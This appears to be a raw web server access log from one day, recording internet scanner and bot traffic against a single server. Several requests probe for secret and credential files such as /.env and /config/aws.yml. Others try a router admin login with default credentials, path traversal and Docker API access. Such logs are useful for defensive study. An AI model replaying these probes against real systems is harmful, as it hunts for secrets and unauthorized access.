117.209.44.47 - - [07/Jan/2025:00:02:19 +0000] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 302 350 "-" "-"
78.153.140.149 - - [07/Jan/2025:06:07:50 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
205.210.31.165 - - [07/Jan/2025:06:24:21 +0000] "\x16\x03\x01" 400 524 "-" "-"
205.210.31.165 - - [07/Jan/2025:06:24:21 +0000] "\x16\x03\x01" 400 524 "-" "-"
65.49.1.109 - - [07/Jan/2025:06:36:16 +0000] "\x16\x03\x01" 400 524 "-" "-"
59.27.9.109 - - [07/Jan/2025:06:47:41 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
185.189.182.234 - - [07/Jan/2025:06:54:24 +0000] "GET / HTTP/1.1" 400 524 "-" "-"
78.153.140.149 - - [07/Jan/2025:07:00:42 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [07/Jan/2025:07:00:42 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
87.120.115.119 - - [07/Jan/2025:07:02:44 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Linux i686 (x86_64)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3187.0 Safari/537.366"
162.216.149.39 - - [07/Jan/2025:07:15:25 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
93.174.93.12 - - [07/Jan/2025:07:29:03 +0000] "\x16\x03\x02\x01o\x01" 400 524 "-" "-"
47.91.125.252 - - [07/Jan/2025:07:49:23 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
179.43.191.146 - - [07/Jan/2025:08:00:08 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
93.174.93.12 - - [07/Jan/2025:08:04:27 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 2.1; en-us; Nexus One Build/ERD62) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17"
193.34.212.75 - - [07/Jan/2025:08:18:36 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
46.19.138.234 - - [07/Jan/2025:08:30:29 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
87.120.115.34 - - [07/Jan/2025:08:35:44 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
154.213.184.132 - - [07/Jan/2025:09:11:11 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
13.91.179.103 - - [07/Jan/2025:09:16:12 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
43.139.243.12 - - [07/Jan/2025:09:18:57 +0000] "GET /config/aws.yml HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
43.139.243.12 - - [07/Jan/2025:09:18:59 +0000] "GET /containers/json HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
43.139.243.12 - - [07/Jan/2025:09:18:59 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
43.139.243.12 - - [07/Jan/2025:09:19:00 +0000] "GET /.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
43.139.243.12 - - [07/Jan/2025:09:19:00 +0000] "GET /aws.yml HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
43.139.243.12 - - [07/Jan/2025:09:19:01 +0000] "GET /version HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
43.139.243.12 - - [07/Jan/2025:09:19:01 +0000] "GET /.env.bak HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
43.139.243.12 - - [07/Jan/2025:09:19:01 +0000] "\x16\x03\x01" 400 524 "-" "-"
43.139.243.12 - - [07/Jan/2025:09:19:02 +0000] "\x16\x03\x01" 400 524 "-" "-"
43.139.243.12 - - [07/Jan/2025:09:19:02 +0000] "\x16\x03\x01" 400 524 "-" "-"
43.139.243.12 - - [07/Jan/2025:09:19:03 +0000] "\x16\x03\x01" 400 524 "-" "-"
43.139.243.12 - - [07/Jan/2025:09:19:04 +0000] "\x16\x03\x01" 400 524 "-" "-"
43.139.243.12 - - [07/Jan/2025:09:19:06 +0000] "\x16\x03\x01" 400 524 "-" "-"
91.223.3.201 - - [07/Jan/2025:09:19:10 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.149 - - [07/Jan/2025:09:27:11 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [07/Jan/2025:09:27:11 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [07/Jan/2025:09:55:00 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [07/Jan/2025:09:55:00 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
175.193.246.71 - - [07/Jan/2025:10:07:13 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
45.156.129.133 - - [07/Jan/2025:10:09:55 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
178.128.54.126 - - [07/Jan/2025:10:18:55 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
178.128.54.126 - - [07/Jan/2025:10:19:00 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
184.105.139.67 - - [07/Jan/2025:10:19:28 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0 (Edition Yx GX)"
184.105.139.67 - - [07/Jan/2025:10:21:28 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0"
184.105.139.67 - - [07/Jan/2025:10:22:07 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0 (Edition Yx GX)"
195.3.223.55 - - [07/Jan/2025:10:51:14 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.34.212.75 - - [07/Jan/2025:10:53:59 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
205.210.31.71 - - [07/Jan/2025:11:05:03 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
91.223.3.201 - - [07/Jan/2025:11:09:43 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
206.168.34.196 - - [07/Jan/2025:11:23:58 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.196 - - [07/Jan/2025:11:24:08 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.196 - - [07/Jan/2025:11:24:09 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.196 - - [07/Jan/2025:11:24:10 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.196 - - [07/Jan/2025:11:24:12 +0000] "PRI * HTTP/2.0" 400 524 "-" "-"
78.153.140.149 - - [07/Jan/2025:11:36:52 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [07/Jan/2025:11:36:52 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
87.120.112.187 - - [07/Jan/2025:11:43:51 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36"
93.174.93.12 - - [07/Jan/2025:12:29:59 +0000] "\x16\x03\x02\x01o\x01" 400 524 "-" "-"
185.16.39.104 - - [07/Jan/2025:12:59:05 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.24.47.8 - - [07/Jan/2025:13:04:18 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
78.153.140.149 - - [07/Jan/2025:13:16:34 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [07/Jan/2025:13:16:34 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
221.149.167.47 - - [07/Jan/2025:13:19:38 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
156.233.225.192 - - [07/Jan/2025:13:27:41 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
156.233.225.192 - - [07/Jan/2025:13:27:42 +0000] "GET /js HTTP/1.1" 301 519 "-" "Go-http-client/1.1"
156.233.225.192 - - [07/Jan/2025:13:27:43 +0000] "GET /js/ HTTP/1.1" 200 840 "http://34.155.227.229/js" "Go-http-client/1.1"
156.233.225.192 - - [07/Jan/2025:13:27:43 +0000] "GET /../js/brand.js HTTP/1.1" 400 488 "-" "Go-http-client/1.1"
156.233.225.192 - - [07/Jan/2025:13:27:44 +0000] "GET /../js/login.js HTTP/1.1" 400 488 "-" "Go-http-client/1.1"
57.152.56.111 - - [07/Jan/2025:13:31:54 +0000] "GET /druid/index.html HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
139.59.101.104 - - [07/Jan/2025:13:34:54 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
179.43.191.146 - - [07/Jan/2025:13:36:43 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
172.104.11.46 - - [07/Jan/2025:13:45:47 +0000] "\x16\x03\x01" 400 524 "-" "-"
46.19.138.234 - - [07/Jan/2025:13:51:22 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
87.236.176.63 - - [07/Jan/2025:14:10:56 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
195.3.223.55 - - [07/Jan/2025:14:18:13 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.149 - - [07/Jan/2025:14:53:30 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [07/Jan/2025:14:53:30 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
195.3.223.55 - - [07/Jan/2025:15:23:12 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.149 - - [07/Jan/2025:15:30:36 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [07/Jan/2025:15:30:36 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
